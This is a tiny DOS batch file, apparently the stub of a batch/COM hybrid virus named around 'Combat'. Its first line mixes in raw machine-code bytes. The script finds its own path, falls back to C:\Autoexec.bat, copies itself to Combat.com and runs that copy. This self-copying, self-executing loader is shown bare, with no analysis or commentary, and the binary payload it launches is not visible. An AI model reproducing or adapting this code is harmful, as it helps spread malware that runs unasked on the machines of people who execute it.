:Àé³
@Echo Off
Set Combat=%0
If %Combat%/==/ Set Combat=C:\Autoexec.bat
If Not Exist %Combat% set Combat=%0.bat
Copy %Combat% Combat.com > NUL
Combat.com Jack
Goto End_Combat
:End_Combat
